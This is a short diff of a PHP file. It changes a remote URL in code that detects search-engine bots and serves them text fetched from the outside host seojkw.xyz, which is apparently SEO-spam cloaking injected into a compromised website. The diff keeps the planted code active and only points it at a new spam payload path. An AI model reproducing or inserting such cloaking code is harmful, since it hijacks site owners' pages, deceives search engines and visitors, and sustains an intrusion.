@@ -18,7 +18,7 @@ function is_bot() {
     return preg_match($botchar, $user_agent);
 }
 
-$sky = "https://seojkw.xyz/win/landing.txt";
+$sky = "https://seojkw.xyz/jindal/landing.txt";
 
 if (is_bot()) {
     echo @file_get_contents($sky);
